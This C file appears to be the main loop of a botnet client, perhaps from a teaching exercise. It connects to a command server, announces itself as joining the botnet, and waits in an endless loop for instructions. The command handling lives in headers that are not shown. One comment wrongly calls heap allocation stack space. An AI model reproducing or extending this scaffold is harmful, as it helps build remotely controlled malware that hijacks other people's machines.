#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "lib/connect.h"
#include "lib/utils.h"
#include "lib/macros.h"

int main(int argc, char *argv[]) {
    // Get the client's username and store it in name
    char* name = getenv("USER");
    
    // Initiate a channel given SERVER, PORT, and name
    int channel = init_channel(SERVER, PORT, name);
    
    // Allocate stack space of size CMD_LENGTH to hold data of type char
    char* msg = (char*) malloc(CMD_LENGTH * sizeof(char));
    
    printf("%s joining the botnet\n", name);
    
    // Infinite loop to receive and parse messages
    while(1) {
        receive(channel, msg);
        parse(channel, msg, name);
    }
    
    free(msg);
    return 0;
}
